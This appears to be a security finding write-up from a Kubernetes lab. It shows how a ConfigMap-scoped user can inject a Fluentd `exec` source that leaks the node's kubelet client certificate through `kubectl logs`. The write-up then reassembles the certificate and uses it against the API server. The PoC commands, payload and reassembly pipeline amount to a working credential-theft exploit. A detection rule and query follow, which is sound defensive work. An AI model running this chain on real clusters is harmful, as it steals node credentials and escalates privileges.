### Summary
Fluentd auto-includes extra config files from a mounted ConfigMap (`fluentd-extra-config`), a common pattern for letting operators add custom log-routing rules without editing the base chart. Any identity that can `update`/`patch` that one ConfigMap - nothing else - can inject Fluentd's `exec` input plugin plus a `stdout` match, and have Fluentd itself print `/var/lib/kubelet/pki/kubelet-client-current.pem` into its own container logs - retrievable with plain `kubectl logs`, no node access, no privileged container, no exec into anything.

### Details
1. Deployment `fluentd-fluentd-elasticsearch` mounts hostPath `/var/lib/kubelet/pki` (read-only) - the actual vulnerable ingredient, present in real fluentd-elasticsearch deployments for reasons unrelated to logging - and hostPath `/var/log/pods`, which its base config tails.
2. The base config (`fluentd-config` ConfigMap, `fluent.conf`) `@include`s everything under `/fluentd/etc/config.d/*.conf`, which is where `fluentd-extra-config` is mounted. Note the tail source carries an `exclude_path` for fluentd's *own* pod directory: without it, Fluentd tails its own stdout, and every parse-failure warning becomes the input of the next warning - exponential echo doubling (see Pitfalls).
3. `log-admin` (a `User`, not a ServiceAccount) is bound to Role `fluentd-config-editor`, scoped via `resourceNames` to just `fluentd-extra-config`: `get/update/patch`, nothing else - a grant that looks like "let ops tweak log routing," not "give this person a path to the node's kubelet identity."
4. `log-admin` patches `fluentd-extra-config` with a `<source>@type exec</source>` whose `command` is `cat /var/lib/kubelet/pki/kubelet-client-current.pem` on a `run_interval`, plus a `<match dummy.exec>@type stdout</match>`.
5. Fluentd does **not** hot-reload ConfigMap changes; the next (re)start of the container loads the injected config. From then on, every interval the `exec` plugin cats the certificate and the injected match re-emits each line - `-----BEGIN CERTIFICATE-----`, every base64 line, the footer - into Fluentd's own stdout, one clean log entry per certificate line, forever.
6. `kubectl logs` on the Fluentd pod now contains the certificate. Reassemble and you have a valid node-level credential.

### PoC
Deploy:
```
$ kubectl apply -f 09-log-admin.yaml
```

Confirm `log-admin`'s only capability:
```
$ kubectl auth can-i get secrets --as=log-admin -n 09-fluentd-log-admin
no

$ kubectl auth can-i update configmaps/fluentd-extra-config --as=log-admin -n 09-fluentd-log-admin
yes

$ kubectl auth can-i update configmaps/fluentd-config --as=log-admin -n 09-fluentd-log-admin
no
```

As `log-admin`, inject the malicious extra config:
```
$ kubectl --as=log-admin -n 09-fluentd-log-admin patch configmap fluentd-extra-config --type merge -p '
{
  "data": {
    "01-custom.conf": "<source>\n  @type exec\n  tag dummy.exec\n  command cat /var/lib/kubelet/pki/kubelet-client-current.pem\n  <parse>\n    @type none\n  </parse>\n  run_interval 60s\n</source>\n\n<match dummy.exec>\n  @type stdout\n</match>\n"
  }
}'
```

Fluentd reads this config at (re)start - it does not hot-reload ConfigMap changes. In a real cluster any routine pod restart, rollout or node churn activates the payload; here, trigger a restart:
```
$ kubectl -n 09-fluentd-log-admin rollout restart deploy/fluentd-fluentd-elasticsearch
```

Within ~a minute of the pod coming back, every 60s the certificate walks through the pod's own logs:
```
$ kubectl -n 09-fluentd-log-admin logs deploy/fluentd-fluentd-elasticsearch | grep 'dummy.exec:'
2026-10-29 12:35:51.545410575 +0000 dummy.exec: {"message":"-----BEGIN CERTIFICATE-----"}
2026-10-29 12:35:51.545931394 +0000 dummy.exec: {"message":"MIICXzCCAUegAwIBAgIRAN4OG5jUAotyqbRrV9gw/XIwDQYJKoZIhvcNAQELBQAw"}
...
```

Reassemble (dedupe keeps one full copy even if several cycles overlap in the log window):
```
$ kubectl -n 09-fluentd-log-admin logs deploy/fluentd-fluentd-elasticsearch --tail=20000 \
    | grep 'dummy.exec:' \
    | sed -E 's/.*dummy\.exec: \{"message":"(.*)"\}/\1/' \
    | awk '!seen[$0]++' > cert_clean.pem

$ file cert_clean.pem
cert_clean.pem: PEM certificate

$ openssl x509 -in cert_clean.pem -noout -subject
subject=O = system:nodes, CN = system:node:node-1
```

```
kubectl --insecure-skip-tls-verify  --client-certificate=cert_clean.pem --client-key=cert_clean.pem --server=$API --kubeconfig <(echo) auth whoami
ATTRIBUTE                                           VALUE
Username                                            system:node:node-1
Groups                                              [system:nodes system:authenticated]
Extra: authentication.kubernetes.io/credential-id   [X509SHA256=adf9b91e9d279cb8246711ddee41a8aba34b57c56cd1eff06c549f52e70f4885]
```

That's the node's kubelet client certificate - use it against the API server for node-level access.

### Pitfalls
The first idea for this attack - replace Fluentd's own log file with a symlink to `kubelet-client-current.pem` and let the base tail source "accidentally" read it - does not work in practice, for three compounding reasons:
- Fluentd doesn't hot-reload ConfigMaps, so nothing executes until a restart anyway.
- The runtime writes to an open file descriptor of the old log inode, so Fluentd's own output never lands in the symlinked file - the container logs stay clean and the certificate read position is tracked by the `pos_file`, which usually skips the (small, static) PEM entirely.
- Even when the symlink *is* read, every parse-failure warning embeds the previous warning verbatim, escaped. The line content doubles per pass until it hits the line-length limit and gets truncated - observed: 246 MB of nested backslashes in `kubectl logs`, zero certificate.

The `exec`-input approach above has none of these problems: it writes each certificate line directly to stdout on every interval, so exfiltration is continuous and idempotent.

### Impact
Any identity with `update`/`patch` on a single, specifically-scoped ConfigMap - one that looks purpose-built to be low-risk - can exfiltrate a node credential with zero pod-level access, zero privileged containers, and zero direct filesystem access of their own. The entire read happens through Fluentd's own legitimate, already-granted hostPath mount; the attacker only ever touches the Kubernetes API.

### KuberHound Detection
Added, mirroring the existing ArgoCD secret-manipulation detection:
- `CONFIGMAP_CREATE`/`CONFIGMAP_UPDATE`/`CONFIGMAP_PATCH` attack capabilities on Role/ClusterRole nodes (`collectors/role_collector.py`, `collectors/clusterrole_collector.py`) - configmaps had no write-capability tracking at all before this, only secrets did.
- `has_fluentd_keyword` on `K8sNamespace` and `has_fluentd_image` on `K8sPod` (`collectors/namespace_collector.py`, `collectors/pod_collector.py`), mirroring the existing `has_argocd_keyword`/`has_argocd_image` fields.
- `create_fluentd_config_manipulation_edges()` (`edges/attack_edges.py`), producing `CAN_ESCALATE_VIA_FLUENTD_CONFIG` edges from any Role/ClusterRole with configmap write capability to namespaces detected as Fluentd-relevant - wired into `kuberhound.py` right after the ArgoCD detection call.

Added query, `"KuberHound: Fluentd RCE via ConfigMap manipulation"`:
```cypher
MATCH p=(identity)-[:BOUND_TO]->(r)-[:CAN_ESCALATE_VIA_FLUENTD_CONFIG]->(ns:K8sNamespace) RETURN p
```
### Advisories
Not a CVE - a consequence of three individually-reasonable decisions compounding: Fluentd auto-including operator-supplied config, Fluentd mounting `/var/lib/kubelet/pki` (present in real fluentd-elasticsearch deployments), and the `exec` input plugin being loadable from that auto-included config. None of the three is wrong in isolation.
